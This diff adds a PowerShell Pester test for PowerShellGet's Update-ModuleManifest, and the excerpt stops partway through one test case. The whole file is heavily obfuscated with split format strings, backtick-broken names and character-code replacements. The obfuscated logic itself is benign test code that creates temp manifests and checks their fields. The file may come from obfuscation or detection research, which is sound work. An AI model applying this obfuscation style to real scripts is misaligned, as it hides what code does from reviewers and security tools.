@@ -1,0 +1,1021 @@
+&("{1}{0}"-f'eT','s')  ("{0}{1}" -f 'J0DEm','N') ( [tYPe]("{1}{2}{0}" -F 'gUid','sy','STEm.') );   &("{2}{0}{1}" -f 'eT','-iTEm','S') ("{0}{1}{2}"-f'vARiABLe',':dGk','U') ( [tYpe]("{0}{2}{3}{1}" -f 'SySTE','IO.FIlE','M','.')  ) ;&('Sv')  ("{1}{0}" -f'lw1','G') ([TYpE]("{2}{5}{1}{0}{3}{4}"-f 'fILemO','M.io.','S','d','e','Yste')  ) ;   ${n`8f`O3v}  =[tYpE]("{1}{0}{2}{5}{4}{6}{3}" -f'ys','s','T','S','cC','Em.Io.FilEa','es')  ; &("{0}{1}"-f'Set','-ItEM') ('vA'+'r'+'iablE'+':NPu') (  [TyPe]("{3}{2}{1}{0}"-f'RE','LESHa','O.fi','sYsTEm.I') )  ;  
+
+
+
+&("{0}{1}{2}"-f 'De','sc','ribe') ("{6}{3}{5}{1}{2}{4}{7}{0}" -f 't','SG','et.Upd','S','ateModuleMan','hell.P','Power','ifes') -Tags 'BVT',("{1}{0}{2}"-f'oo','InnerL','p') {
+
+    &("{2}{0}{1}"-f're','All','Befo') {
+        &("{1}{3}{0}{4}{2}"-f 'o','I','le','mp','rt-Modu') "$PSScriptRoot\PSGetTestUtils.psm1" -WarningAction ("{2}{0}{3}{1}"-f'ntl','ue','Sile','yContin')
+        &("{1}{0}{2}" -f'port-Modul','Im','e') "$PSScriptRoot\Asserts.psm1" -WarningAction ("{2}{3}{0}{1}{4}"-f'n','tin','Silen','tlyCo','ue')
+        ${scri`PT:t`EmP`p`ATh} = &("{0}{1}{2}{3}" -f 'G','et-','Te','mpPath')
+        ${ScR`IP`T`:pSG`eTmodu`Lein`Fo} = &("{3}{0}{4}{1}{2}" -f'r','Mo','dule','Impo','t-') ("{2}{0}{1}"-f 'werShe','llGet','Po') -Global -Force -Passthru
+    }
+
+    &("{3}{0}{1}{2}" -f'oreE','a','ch','Bef') {
+        
+        ${s`c`RipT:TEM`pM`OdUlE`Sp`A`TH} = &("{2}{0}{1}" -f'n-Pat','h','Joi') ${s`c`RiPT:T`EM`pp`AtH} "PSGet_$(Get-Random)"
+        ${nu`ll} = &("{1}{0}" -f 'tem','New-I') -Path ${s`CR`I`pT:`TE`MpmoDuLes`PAth} -ItemType ("{1}{2}{0}"-f 'tory','D','irec') -Force
+
+        ${sCr`IPt`:`U`PDA`TeM`oDuL`em`AniFeStN`AMe} = ("{0}{2}{3}{5}{4}{1}"-f'Conto','e','soP','ub','l','lishModu')
+        ${sc`R`ipt:uPdATEMO`d`U`leMani`FEStba`se} = &("{3}{1}{2}{0}" -f 'th','in-P','a','Jo') ${S`cRi`Pt:temPm`od`U`Le`SpaTH} ${SCriPt:uPDa`T`eModulE`ManiFESt`N`AME}
+        ${n`ULl} = &("{2}{0}{1}" -f 'w-Ite','m','Ne') -Path ${Scr`I`Pt`:`U`PDAtEmOdUlE`ManiFeS`T`BaSE} -ItemType ("{1}{0}{2}"-f 'ect','Dir','ory') -Force
+
+        ${s`cR`IPT:`TES`T`mAnI`FEstpa`Th} = &(("{5}{1}{11}{3}{4}{0}{9}{7}{8}{6}{10}{2}" -f 'e','.P','h','e','rSh','Microsoft','oin','n','agement97VJ','ll.Ma','-Pat','ow'))."r`ep`lace"(([CHaR]57+[CHaR]55+[CHaR]86),'\') -Path ${SCr`IpT:`UPD`A`TemOdU`leMAnifestbASE} -ChildPath "$script:UpdateModuleManifestName.psd1"
+    }
+
+    &("{1}{2}{0}" -f 'ach','Afte','rE') {
+        &("{0}{1}{2}" -f 'R','emoveIte','m') "$script:TempModulesPath\*"
+    }
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{10}{2}{1}{7}{8}{4}{11}{9}{5}{6}{0}{12}{3}"-f 'am','t','pda','s','e','oAddition','alPar','eM','oduleManif','N','U','stWith','eter') {
+        
+        
+        ${sC`R`iPt:p`s`gETM`ODu`lePATh} = &("{2}{3}{1}{0}"-f'ath','n-P','Jo','i') ${scR`Ip`T:TE`m`PmoDULe`s`PATh} ("{1}{3}{0}{2}" -f 'Ge','PowerSh','t','ell') 
+        ${NU`ll} = &("{1}{2}{0}" -f 'em','Ne','w-It') -Path ${sCRIp`T:p`Sge`T`mod`UlE`P`AtH} -ItemType ("{2}{1}{0}{3}"-f 'recto','i','D','ry') -Force
+        &("{1}{0}{2}" -f'y-It','Cop','em') -Path "$($script:psgetModuleInfo.ModuleBase)\*" -Destination ${S`CRIpT`:`p`Sg`Etmo`dulePA`Th} -Recurse -Force
+        ${Psg`etM`AnIFeS`Tp`Ath} = &("{1}{0}{2}" -f '-Pa','Join','th') "$script:PSGetModulePath" ("{1}{2}{3}{0}" -f'1','Pow','erShellGet','.psd')
+
+        
+        &("{1}{3}{0}{2}{4}" -f '-ItemPr','Se','op','t','erty') ${pSgEt`Man`If`E`St`paTh} -Name ("{1}{2}{0}"-f'Only','IsRea','d') -Value ${Fa`l`SE}
+
+        ${Oldm`od`Ule`inFO} = &("{3}{0}{2}{1}{4}"-f 'e','es','Manif','Test-Modul','t') -Path ${P`sgE`TmAnIFeStpA`TH}
+        &("{4}{5}{2}{3}{0}{1}"-f'le','Manifest','M','odu','Updat','e-') -path ${pS`G`ETM`Ani`FEsT`PATH}
+        ${N`e`w`MODuleiNfO} = &("{2}{3}{1}{0}" -f 'est','leManif','Test','-Modu') -Path ${P`sGeTm`ANiFeS`TPaTh}
+
+        &("{3}{2}{0}{1}" -f't','Equals','sser','A') ${NEWmOdU`L`EI`N`Fo}."g`Uid" ${Old`mODul`Ein`Fo}."G`Uid" "Guid should be $($oldModuleInfo.Guid) "
+        &("{2}{3}{1}{0}"-f 'als','rtEqu','Ass','e') ${n`eWm`OduLe`InfO}."A`UT`hor" ${OLD`MoDUlEi`NfO}."AU`Th`oR" "Author name should be $($oldModuleInfo.Author) "
+        &("{2}{1}{0}"-f'Equals','t','Asser') ${NewMO`d`Ul`e`InFo}."C`OMP`ANYname" ${old`Mo`dULE`i`NfO}."COMPaN`y`N`AMe" "Company name should be $($oldModuleInfo.CompanyName) "
+        &("{3}{2}{0}{1}" -f 'tEqua','ls','ser','As') ${new`mod`UL`e`iNfO}."CopYrig`hT" ${oLd`MOdu`L`eINfo}."COPyrI`g`HT" "Copyright should be $($oldModuleInfo.CopyRight) "
+        &("{2}{0}{1}" -f't','Equals','Asser') ${Ne`W`Mo`DuLe`INFO}."Roo`TMOD`ULe" ${Ol`dmoDule`I`NFo}."R`oOtMo`DU`Le" "RootModule should be $($oldModuleInfo.RootModule) "
+        &("{2}{1}{0}"-f 'uals','sertEq','As') ${ne`Wmodu`LeINfO}."vErS`IoN" ${ol`Dmo`dU`LeIN`Fo}."v`eRsioN" "Module version should be $($oldModuleInfo.Version) "
+        &("{0}{1}{2}" -f'Assert','Eq','uals') ${NewmOdu`L`eiNFo}."DES`C`R`iption" ${o`ldMOduLe`in`Fo}."dESCr`IPti`On" "Description should be $($oldModuleInfo.Description) "
+        &("{0}{2}{1}{3}" -f 'A','sertEq','s','uals') ${NE`WM`O`DuleINfo}."prOCeSsO`R`Arc`hiTE`cTurE" ${O`LdM`O`d`ULEINfO}."pRoCE`SsorArch`I`TEcTURE" "Processor architecture name should be $($oldModuleInfo.ProcessorArchitecture) "
+        &("{1}{0}{2}" -f 'qua','AssertE','ls') ${NewM`od`UleI`N`Fo}."cL`RVErS`IOn" ${OLd`moDulEiN`Fo}."cL`RvErs`IOn" "ClrVersion should be $($oldModuleInfo.ClrVersion) "
+        &("{3}{0}{1}{2}"-f'ertE','qu','als','Ass') ${neWmOD`U`LEINFO}."dOtNetF`RaM`EwoRKv`ErS`ION" ${oLdmo`dUlE`InFo}."d`OTNETfR`AmEwOr`KV`eRSiOn" "Dot Net Framework version should be $($oldModuleInfo.DotNetFrameworkVersion) "
+        &("{3}{0}{2}{1}"-f'sse','Equals','rt','A') ${nE`Wmo`DulE`InFo}."pO`W`eRsHEL`LhOs`TvE`Rs`ion" ${OLDmO`DuL`e`INfo}."Po`WERshElLHOST`VE`RsI`on" "PowerShell Host Version should be $($oldModuleInfo.PowerShellHostVersion) "
+        &("{2}{1}{0}{3}" -f'Eq','rt','Asse','uals') ${n`EWMODuL`einFo}."p`oWe`R`ShEL`Lho`STvErsioN" ${old`mo`Dule`iNFo}."pOWE`RS`HEll`HOsTVErs`ioN" "PowerShell Host Version should be $($oldModuleInfo.PowerShellHostVersion) "
+        &("{0}{2}{1}{3}"-f'Asser','l','tEqua','s') ${newmo`D`U`LeInFO}."P`ROjECT`UrI" ${oLdmODul`ein`FO}."PrOJ`Ec`TUri" "ProjectUri should be $($oldModuleInfo.ProjectUri) "
+        &("{1}{2}{0}"-f 'uals','Asse','rtEq') ${NEWM`OdULE`i`Nfo}."LIC`ens`eUri" ${olDMO`d`UlEI`NFo}."L`IcE`Nse`UrI" "LicenseUri should be $($oldModuleInfo.LicenseUri) "
+        &("{1}{2}{0}" -f 'uals','Ass','ertEq') ${n`ewM`odUL`Einfo}."I`co`NURI" ${O`lDMO`DUle`Info}."icO`N`Uri" "IconUri should be $($oldModuleInfo.IconUri) "
+        &("{2}{1}{0}" -f'als','u','AssertEq') ${NE`Wm`ODULEiNfO}."R`eleaseNo`T`eS" ${O`LdMOd`ULe`INfO}."rE`leA`SeNOtes" "ReleaseNotes should be $($oldModuleInfo.ReleaseNotes) "
+        &("{1}{3}{2}{0}"-f'Equals','A','t','sser') ${NEwMODu`LeiN`FO}."he`lPin`F`oUri" ${old`mODULe`I`NFO}."hELpin`F`ourI" "HelpInfoURI should be $($oldModuleInfo.HelpInfoURI) "
+        &("{3}{0}{2}{1}" -f'ssert','quals','E','A') ${ne`Wm`o`dUlEIn`FO}."rEqU`i`Red`mODuleS"."M`OdulETY`Pe" ${O`ldMOdU`leI`Nfo}."r`EquIReDmO`D`ULES"."MOd`ULe`Type" "RootModule ModuleType should be $($oldModuleInfo.RequiredModules.ModuleType) "
+        &("{0}{2}{1}" -f'A','sertEquals','s') ${N`eW`MoDU`le`InFo}."rE`QUI`R`E`DmOdules"."NA`mE" ${oLDm`odU`lEINFO}."REquIrEDm`o`DU`lES"."NA`Me" "RootModule ModuleType should be $($oldModuleInfo.RequiredModules.Name) "
+        &("{2}{0}{1}" -f'rtEqu','als','Asse') ${Ne`wM`o`DulEi`Nfo}."Exp`ORtEd`Fo`R`matFil`eS"."C`ounT" ${O`Ldm`Odu`LeInFO}."ExpoR`TED`Fo`RMatfi`lEs"."C`ouNT" "ExportedFormatFiles count should be $($oldModuleInfo.ExportedFormatFiles.Count) "
+        &("{0}{2}{1}"-f 'As','t','ser') (${NE`wMO`DUl`EIN`Fo}."E`x`POrTeDfOrMATfil`ES"[0] -match ("{2}{1}{0}{3}{4}"-f'.Format.ps','SGet','P','1x','ml')) ((("{9}{6}{3}{4}{1}{2}{0}{10}{8}{5}{7}" -f ' {0}PSGet.Fo','File should conti','an','t','s','ps1xml{0','ed Forma','}','at.','Export','rm'))  -f[char]39)
+        &("{0}{1}"-f 'Asser','t') (${newMO`du`LeINfo}."mod`UelI`St"."co`UNT" -eq ${OLDm`odUL`eiN`Fo}."MO`DulEli`St"."CO`UNt") "Module list count should be $($oldModuleInfo.ModuleList.Count) ";
+        &("{1}{0}{2}{3}"-f 'r','Asse','tEqu','als') ${NE`wModULe`inFo}."EXPorte`d`FUN`CTiONS"."C`oUnt" ${oLDMOdul`E`info}."e`XPoR`TeDFUN`CT`io`Ns"."coU`NT" "ExportedFunctions count should be $($oldModuleInfo.ExportedFunctions.Count) "
+        &("{1}{0}"-f'sert','As') (${N`eWMOdulEi`Nfo}."eXpoRt`ED`F`UnCTiOns"."k`eYS" -contains ("{2}{0}{3}{1}" -f 'll-','dule','Insta','Mo')) ((("{6}{3}{1}{0}{8}{2}{5}{4}{9}{7}" -f 'd','e','unctions sh','rt',' 9JhI','ould include','Expo','all-Module9Jh)','F','nst'))."Re`pLaCe"(([chAR]57+[chAR]74+[chAR]104),[STriNg][chAR]39))
+        &("{2}{0}{1}"-f 'se','rt','As') (${N`E`WmO`DULeiNFO}."E`xPO`R`Te`D`FUnctIONS"."k`eYs" -contains ("{1}{0}{2}"-f'd-Modu','Fin','le')) (((("{7}{8}{6}{10}{4}{0}{14}{3}{11}{5}{15}{12}{2}{9}{1}{13}"-f 'ho','F','ules','lu','s s','JF','nc','Exporte','dFu','J','tion','de s','all-Mod',')','uld inc','Inst'))  -CrePlaCe ([Char]115+[Char]74+[Char]70),[Char]39))
+        &("{0}{2}{3}{1}"-f'Asser','s','tE','qual') ${NeW`MOdUL`e`InFo}."Ex`POrTE`dAliAS`Es"."CO`Unt" ${oLd`Mo`dUlEIn`Fo}."exp`oRTeda`liasES"."Co`UNT" "ExportedAliases count should be $($oldModuleInfo.ExportedAliases.Count) "
+        &("{1}{2}{0}" -f 't','Asse','r') (${n`E`WMOD`U`lEiNFO}."E`x`pOrTEdAli`AsES"."k`EYs" -contains ("{0}{1}"-f'in','mo')) ((("{2}{1}{5}{4}{3}{6}{0}{7}" -f'nclude uiQin','rtedAliases sh','Expo','ld ','u','o','i','mouiQ)'))."reP`La`ce"(([chaR]117+[chaR]105+[chaR]81),[STrIng][chaR]39))
+        &("{0}{1}"-f'Asse','rt') (${n`EW`M`ODUL`eiNfO}."EX`pORtEdALi`AS`es"."ke`Ys" -contains ("{0}{1}"-f 'f','imo')) (((("{5}{9}{7}{8}{4}{6}{2}{0}{3}{10}{1}"-f'ud','f)','l','e oXff','i','ExportedAlia','nc','s ','should ','se','imooX')) -REPlACE ([chAr]111+[chAr]88+[chAr]102),[chAr]39))
+        &("{0}{2}{1}"-f'As','t','ser') (${NE`w`MOdu`lEiNFo}."EXPOrtedAli`AS`es"."KE`YS" -contains ("{1}{0}"-f 'o','upm')) (((("{10}{2}{3}{7}{8}{6}{9}{11}{5}{4}{1}{0}" -f')','mo{0}','tedAlia','s','p','0}u','i','es should',' ','nclud','Expor','e {'))-F[chAr]39))
+        &("{0}{1}"-f'A','ssert') (${n`e`wMOdU`l`eiNFo}."eX`poRTe`dAL`iAseS"."ke`ys" -contains ("{1}{0}" -f 'o','pum')) (((("{3}{9}{6}{1}{5}{4}{8}{0}{2}{7}"-f 'o{',' should inc','0','E',' {0}pu','lude','s','})','m','xportedAliase'))  -F [cHAR]39))
+        if(${p`sV`ERSI`o`NTaBle}."Ve`Rs`ioN" -ge ("{0}{1}"-f '5.0','.0'))
+        {
+            &("{3}{1}{0}{2}" -f'er','s','tEquals','As') ${NEwMO`DULeI`NFO}."Ta`gS"."cou`Nt" ${olDmO`dUL`EinFO}."TA`GS"."COu`Nt" "Tags count should be $($oldModuleInfo.Tags.Count) "
+        }
+        &("{3}{1}{0}{2}"-f'tEqua','ser','ls','As') ${nEWMO`Dul`EIn`FO}."Fil`el`iST"."co`UNt" ${OL`DmodULEIN`Fo}."fILel`I`ST"."C`ounT" "FileList count should be $($oldModuleInfo.FileList.Count) "
+        &("{0}{1}{2}" -f 'Asse','rtEqual','s') ${NeWM`ODu`le`iNfo}."f`I`lelist"[0] ${oLdmO`dUlEi`Nfo}."fI`lel`IsT"[0] "FileList[0] should be $($oldModuleInfo.FileList[0]) "
+        &("{0}{2}{1}" -f'Ass','quals','ertE') ${nEw`M`ODulEinFO}."fIlEl`ISt"[1] ${o`LdMO`dU`L`eINFo}."fi`lEL`ISt"[1] "FileList[0] should be $($oldModuleInfo.FileList[1]) "
+        
+        &("{3}{1}{0}{2}"-f'e','s','rtEquals','As') ${nEwModule`I`N`FO}."pR`i`VAtEda`TA"."Pac`ka`GemANAGe`m`EntPrOvI`De`RS" ${OLDM`Od`UlE`Info}."pr`IV`Ated`ATA"."P`AcKageM`AnAgEMEnTpr`o`VIDers" "PackageManagement Providers should be $($oldModuleInfo.PrivateData.PackageManagementProviders) "
+        if(${newM`od`UleI`NfO}."Pri`VaTEdA`TA"."su`p`porTeDpOwErSHel`lGEtFOrmat`V`ErsIoNS" -is [Array])
+        {
+            &("{0}{2}{1}"-f 'As','ls','sertEqua') ${N`ew`mO`dU`leInFo}."pRiVa`TeDA`Ta"."sUpP`O`R`TEdPowErshE`L`lgeTF`OrMAtve`R`SIO`Ns"."cOu`Nt" ${O`ldM`ODULE`InfO}."P`R`IvA`TeDATA"."su`ppoRtEDpOweRSh`elL`g`etFo`RMatVErSiO`NS"."Co`UNt" "SupportedPowerShellGetFormatVersions count should be $($oldModuleInfo.PrivateData.SupportedPowerShellGetFormatVersions.Count) "
+            foreach(${v`ER} in ${o`L`DmoDu`lEiNfo}."p`RivaTe`da`TA"."supPo`RT`EDpowE`RSHe`lLGetFoRMatVersI`oNS")
+            {                
+	            &("{1}{0}" -f 'ert','Ass') (${neWmo`dUleiN`FO}."PRIv`ATeD`ATa"."SuP`poRtedp`OWErs`heL`L`GET`F`O`R`MAtVeRs`IOns" -contains (${V`Er})) "SupportedPowerShellGetFormatVersions should contain $($ver) "
+            }
+        }
+        else
+        {
+            &("{0}{1}{2}"-f'As','sert','Equals') ${N`e`wmODUlE`In`FO}."PrI`V`AteDaTA"."SU`pPORt`E`dP`O`werSH`eL`lgeTFoRm`AtveRSi`OnS" ${OL`dM`oduLEiNfO}."pri`VAte`d`ATa"."Sup`POrTeDP`Owers`HeLLGetFORmATveRs`I`OnS" "SupportedPowerShellGetFormatVersions should be $($oldModuleInfo.PrivateData.SupportedPowerShellGetFormatVersions) "
+        }
+    } `
+    -Skip:$(${is`WinDo`ws} -eq ${fa`lse})
+
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{0}{6}{2}{7}{8}{10}{1}{9}{12}{11}{3}{5}{4}" -f'Updat','tWithNoA','Man','alPa','meters2','ra','eModule','i','f','d','es','n','ditio') {    
+
+        if(${p`SVer`SI`ONTABLe}."P`S`VERs`IOn" -ge ("{1}{0}" -f '.0.0','3') -and ${PSvEr`Sio`Nta`B`le}."VE`Rsi`ON" -lt ("{1}{0}" -f '.0.0','5'))
+        {
+            &("{3}{2}{1}{0}" -f 'eManifest','odul','w-M','Ne') -Path ${Scri`pT:tEsT`maNIf`e`sTp`A`Th} -ModuleVersion '1.0' -FunctionsToExport '*' -CmdletsToExport '*' -AliasesToExport '*' -VariablesToExport '*'
+            ${expe`CT`edl`EN`GTh} = 4
+        }
+        else
+        {
+            &("{0}{2}{1}{3}"-f 'New-Module','ni','Ma','fest') -Path ${SCRIPT:TE`st`mANife`s`TPath} -ModuleVersion '1.0' -FunctionsToExport '*' -CmdletsToExport '*' -AliasesToExport '*' -VariablesToExport '*' -DscResourcesToExport '*'
+            ${exP`ec`TEd`lE`Ngth} = 5
+        }
+
+        
+        (&("{2}{0}{1}"-f'-conte','nt','get') ${Sc`R`IPT:TEstm`AN`ife`stpAth}) | &("{1}{3}{2}{0}" -f'object','forea','-','ch') {${_} -replace ("{1}{0}{2}"-f'nkno','U','wn'), ''} | &("{3}{2}{0}{1}"-f'n','t','-conte','set') ${SCrIp`T:tEsTmAN`iF`EStPA`Th}
+        ${e`diTEDM`ODu`LEi`NfO} = &("{3}{4}{2}{0}{1}{5}"-f 'ni','f','eMa','Test-Mo','dul','est') -Path ${Sc`Rip`T:`TEsTMANife`sTPAtH}
+
+        &("{0}{5}{2}{1}{3}{6}{4}"-f'Upda','d','o','uleM','est','te-M','anif') -path ${SC`Ri`p`T`:TeStMaNiFeST`pATH} -ModuleVersion '2.0'
+        ${UPdATEDMo`D`U`lE`InfO} = &("{1}{3}{2}{0}"-f 'st','Tes','fe','t-ModuleMani') -Path ${ScrI`pt:TEsTMani`FeST`pa`Th}
+        
+        ${tE`xT} = @(&("{3}{1}{0}{2}" -f 'nte','t-Co','nt','Ge') -Path ${SCR`IP`T:TestmaNif`eStP`ATh} | &("{1}{2}{0}" -f'String','Se','lect-') "\*")
+
+        &("{0}{1}{2}"-f'Asser','t','Equals') ${up`D`AT`e`dMODuLEI`Nfo}."CoM`p`ANYNAMe" ${eDi`T`eD`MOdUlEi`Nfo}."c`omPAnY`N`Ame" ('Compan'+'y '+'nam'+'e '+'shou'+'ld'+' '+'b'+'e '+"$expectedCompanyName")
+        &("{2}{1}{0}"-f 'als','Equ','Assert') $(${T`Ext}."LeN`g`TH") ${EXPEcte`DL`engTh} ('Nu'+'mber '+'o'+'f '+'wi'+'ldcar'+'ds '+'sho'+'uld '+'be'+' '+"$expectedLength")
+    }
+
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{4}{11}{6}{2}{0}{7}{1}{3}{8}{9}{5}{10}" -f'Mani','estW','le','ith','Updat','aram','Modu','f','NoAd','ditionalP','eters3','e') {
+
+        &("{1}{3}{2}{0}"-f'leManifest','New','u','-Mod') -Path ${scripT`:tE`s`TmAN`If`eSTpAth} -ModuleVersion '1.0' -FunctionsToExport ("{2}{1}{0}" -f 'nction1','u','f') -NestedModules ("{7}{8}{5}{2}{1}{3}{6}{0}{4}" -f 'm','ll.M','e','a','ent','h','nage','Microsoft.Pow','erS') -AliasesToExport ("{0}{1}"-f'al','ias1')
+        &("{0}{2}{1}{4}{3}" -f 'Upda','e-M','t','uleManifest','od') -Path ${SC`RipT`:T`EsTMaNI`F`Es`T`PATH}
+
+        &("{4}{5}{2}{1}{0}{3}"-f 'lized','a','port-Loc','Data','I','m') -BindingVariable ("{5}{1}{4}{3}{2}{0}"-f'le','u','tHashTab','nifes','leMa','Mod') `
+                     -FileName (&(("{7}{5}{0}{4}{2}{1}{9}{3}{6}{8}{10}{11}"-f 'croso','rShe','Powe','.Manageme','ft.','i','ntp9ZSpl','M','it-Pa','ll','t','h')).("{1}{0}" -f 'Eplace','r').Invoke('p9Z','\') ${ScrI`Pt:T`EstmA`NIfE`s`TpA`TH} -Leaf) `
+                     -BaseDirectory (&((("{10}{11}{12}{7}{1}{2}{13}{4}{9}{6}{3}{8}{0}{5}"-f'p','Power','S','q','.Manageme','lit-Path','t8t','ft.','S','n','Micr','os','o','hell')) -RePlaCe ([chaR]56+[chaR]116+[chaR]113),[chaR]92) ${S`CR`iPT:teS`TM`AniF`EStpAtH} -Parent) `
+                     -ErrorAction ("{1}{3}{2}{0}"-f'ue','S','in','ilentlyCont') `
+                     -WarningAction ("{2}{0}{1}" -f 'ile','ntlyContinue','S')
+
+        &("{3}{0}{1}{2}" -f's','ert','Equals','As') ${mOduLeMAnI`Fes`T`h`A`ShtA`BLe}."Fu`Nc`TiOn`STOeXp`OrT" ("{2}{0}{1}"-f'unctio','n1','f') ((("{6}{4}{3}{12}{5}{1}{9}{0}{8}{10}{7}{11}{2}" -f ' ','b','tion1XeO','ncti','u','t should ','F','Ofun','X','e','e','c','onsToExpor'))."REPlA`Ce"('XeO',[StRinG][cHAR]39))
+        &("{1}{2}{0}" -f 'uals','Ass','ertEq') ${mOdu`L`Em`AnIf`EStHASh`TAB`lE}."n`ESteDM`OD`UlES" ("{5}{8}{0}{7}{4}{6}{3}{9}{1}{2}"-f'osoft.P','g','ement','.Man','rShe','Mic','ll','owe','r','a') ((("{0}{8}{1}{2}{5}{4}{6}{3}{7}" -f 'NestedM','d','ule','e1A','hould ','s s','be ASamodul','Sa','o')) -rePLacE([cHAR]65+[cHAR]83+[cHAR]97),[cHAR]39)
+        &("{1}{0}{3}{2}" -f'se','As','tEquals','r') ${MOD`U`L`EMaNIfeStH`ASHtA`BLE}."aL`iA`SEST`OeXPo`Rt" ("{1}{0}{2}"-f 'as','ali','1') ((("{0}{8}{7}{6}{5}{1}{2}{4}{3}"-f'Aliases','d',' be 4','rO','rOalias14','houl','port s','oEx','T'))-crePlaCe  '4rO',[CHAr]39)
+    } 
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{1}{8}{0}{6}{3}{5}{4}{2}{7}"-f'ModuleManif','U','m','stWithDef','ltCom','au','e','andPrefix','pdate') {
+
+        ${D`EFa`ULTcOM`Ma`NDpRe`FiX} = ("{0}{2}{1}" -f'P','fix','re')
+        ${cMD`lE`Ts`T`Oex`pOrT} = ("{1}{0}{2}"-f'ortCmdl','Exp','et'), ("{4}{3}{1}{2}{0}"-f 'dlet','or','tCm','xp','PrefixE'), ("{1}{3}{0}{2}"-f'x','ExportP','Cmdlet','refi'), ("{3}{0}{2}{4}{1}" -f'e','x','tP','ExportCmdl','refi'), ("{2}{3}{0}{1}"-f'dle','t','Export-C','m'), ("{1}{3}{4}{5}{0}{2}" -f 'm','E','dlet','xport-Prefi','x','C'), 
+                           ("{1}{0}{3}{2}" -f'o','Exp','etPrefix','rt-Cmdl'), ("{1}{3}{2}{0}{4}"-f'md','Exp','ixC','ort-CmdletPref','let'), ("{3}{0}{2}{1}" -f 'xpo','et','rtPrefix-Cmdl','E'), ("{7}{4}{2}{1}{3}{5}{0}{6}" -f'xC','Pr','t','efix-Pre','xpor','fi','mdlet','E'), ("{2}{1}{0}{5}{7}{4}{3}{6}" -f'or','p','Ex','-Cmdlet','efix','t','Prefix','Pr'), 
+                           ("{5}{0}{4}{2}{1}{3}" -f'efi','tPrefixCmdl','-Cmdle','et','x','ExportPr'), ("{5}{10}{6}{3}{7}{4}{1}{0}{9}{8}{2}"-f 'mdle','PrefixC','mdlet','r','fix-','E','po','tPre','xC','t-Prefi','x'), ("{0}{4}{3}{1}{5}{2}"-f 'PrefixE','m','et','ort-C','xp','dl'), ("{2}{1}{0}{3}{5}{4}" -f 'ixE','ef','Pr','xpo','fixCmdlet','rt-Pre'), 
+                           ("{2}{5}{1}{0}{3}{4}"-f 'po','ixEx','P','rt-C','mdletPrefix','ref'), ("{2}{3}{0}{1}{6}{5}{4}" -f'i','xExport-Cmdle','Pre','f','Cmdlet','ix','tPref')
+
+        ${FUn`ctI`OnSTOe`xPoRt} = ("{2}{0}{1}"-f 'ortF','unction','Exp'), ("{4}{3}{1}{2}{0}" -f 'n','t','Functio','Expor','Prefix'), ("{5}{6}{1}{4}{2}{0}{3}"-f 'o','efi','i','n','xFunct','ExportP','r'), ("{3}{1}{0}{2}" -f'Pr','unction','efix','ExportF'), ("{0}{1}{2}{3}" -f'E','x','port','-Function'), ("{6}{5}{0}{4}{1}{2}{3}"-f'Pref','x','Functi','on','i','-','Export'), 
+                             ("{4}{1}{3}{2}{0}{5}"-f 'refi','ctio','P','n','Export-Fun','x'), ("{5}{4}{8}{1}{6}{0}{3}{2}{7}"-f'onP','t-Funct','ixF','ref','xp','E','i','unction','or'), ("{0}{1}{3}{2}{4}"-f'ExportPr','efi','F','x-','unction'), ("{4}{2}{1}{5}{0}{3}" -f'unct','x','-Prefi','ion','ExportPrefix','F'), ("{2}{1}{3}{4}{0}"-f'ctionPrefix','ef','ExportPr','ix-F','un'), 
+                             ("{6}{2}{1}{4}{0}{3}{7}{5}" -f'ion','ix-Fu','Pref','Pr','nct','Function','Export','efix'), ("{5}{1}{2}{4}{0}{6}{3}"-f'f','efix-PrefixFu','ncti','tion','on-Pre','ExportPr','ixFunc'), ("{4}{5}{0}{1}{2}{3}"-f'x','port','-Fu','nction','P','refixE'), ("{2}{3}{5}{4}{1}{0}{6}"-f'xFunctio','i','Pr','e','-Pref','fixExport','n'), 
+                             ("{2}{1}{4}{0}{3}{5}" -f 'n','ixExport','Pref','P','-Functio','refix'), ("{5}{0}{6}{7}{2}{1}{3}{4}"-f 'u','PrefixFunct','on','i','on','PrefixExport-F','n','cti')
+
+        ${a`lIAs`eSToeX`pO`Rt} =  ("{2}{1}{0}"-f 'tAlias','por','Ex'), ("{2}{1}{0}{3}" -f 'xpor','efixE','Pr','tAlias'), ("{0}{1}{3}{4}{2}"-f 'Ex','portPr','s','efixAl','ia'), ("{0}{3}{2}{1}" -f'Ex','iasPrefix','Al','port'), ("{1}{3}{0}{2}"-f'ia','Export','s','-Al'), ("{1}{3}{0}{2}" -f'ort-Pre','Ex','fixAlias','p'),("{2}{3}{4}{0}{1}" -f'liasPref','ix','Exp','ort-','A'), 
+                            ("{1}{3}{4}{5}{2}{0}" -f 's','Export-A','ixAli','l','ias','Pref'), ("{4}{1}{3}{2}{0}"-f 'fix-Alias','port','e','Pr','Ex'), ("{1}{7}{6}{0}{2}{4}{5}{3}" -f 'x','Exp','-Pref','ias','ixA','l','refi','ortP'), ("{1}{4}{3}{2}{6}{5}{0}" -f'fix','ExportPref','as','li','ix-A','re','P'), ("{2}{4}{6}{0}{1}{5}{3}" -f'asPref','i','Export','s','Prefix-','xAlia','Ali'), 
+                            ("{2}{3}{0}{1}{4}{5}"-f'ix-P','refixAlias-PrefixAl','Export','Pref','i','as'), ("{2}{0}{1}{3}" -f 'Export-Al','i','Prefix','as'), ("{3}{2}{1}{4}{0}{5}" -f 'l','refi','ixExport-P','Pref','xA','ias'), ("{5}{2}{3}{4}{0}{1}" -f 'f','ix','t-A','lia','sPre','PrefixExpor'), ("{0}{1}{5}{4}{3}{2}" -f 'PrefixE','xport','PrefixAlias','as','i','-Al')
+
+        &("{2}{1}{0}{3}"-f 'es','if','New-ModuleMan','t')  -Path ${scrI`PT`:tesTma`N`I`FESTpa`Th} -Confirm:${FAL`SE} -DefaultCommandPrefix ${defAUl`Tc`oMmaND`p`R`eFiX} -CmdletsToExport ${cmd`lETSto`eXp`o`Rt} `
+                            -FunctionsToExport ${funCt`ION`SToe`xpo`RT} -AliasesToExport ${aLi`A`sESTOE`X`POrt} 
+        &("{3}{2}{5}{4}{1}{0}"-f 'fest','leMani','te','Upda','du','-Mo') -Path ${ScR`IP`T:tE`StM`Ani`FE`stPATH}
+        
+        &("{5}{1}{6}{0}{3}{4}{2}" -f'Local','m','a','i','zedDat','I','port-') -BindingVariable ("{6}{5}{2}{4}{3}{0}{1}"-f'ab','le','an','ashT','ifestH','leM','Modu') `
